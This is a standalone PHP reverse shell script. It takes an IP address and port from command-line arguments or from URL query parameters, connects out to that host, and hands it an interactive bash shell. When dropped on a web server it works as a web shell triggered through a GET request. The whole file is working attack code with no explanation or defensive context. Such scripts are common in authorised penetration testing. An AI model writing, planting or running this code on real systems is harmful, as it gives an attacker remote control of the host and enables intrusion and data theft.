<?php
ignore_user_abort(true);
set_time_limit(0);
if(PHP_SAPI === 'cli'){
    if($argc !== 3) { die("Target ip:port missing\n"); }
    $target = filter_var($argv[1], FILTER_VALIDATE_IP);
    $port = filter_var($argv[2], FILTER_SANITIZE_NUMBER_INT);
} else {
    $target = filter_input(INPUT_GET, 'target', FILTER_VALIDATE_IP);
    $port = filter_input(INPUT_GET, 'port', FILTER_SANITIZE_NUMBER_INT);
}
$command = "/bin/bash -i <&3 >&3 2>&3";
if(($sock = fsockopen("{$target}:{$port}")) === FALSE) { die("Error opening socket\n"); }
$descriptorspec = [
    0 => ["pipe","r"], // stdin
    1 => ["pipe","w"], // stdout
    2 => ["pipe","w"], // stderr
    3 => $sock 		   // socket fd
];
if(($process = proc_open($command,$descriptorspec,$pipes)) === FALSE){ die("Shell spawn failed\n"); }
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
fclose($sock);
$ret = proc_close($process);
echo "Command returned {$ret}\n";
?>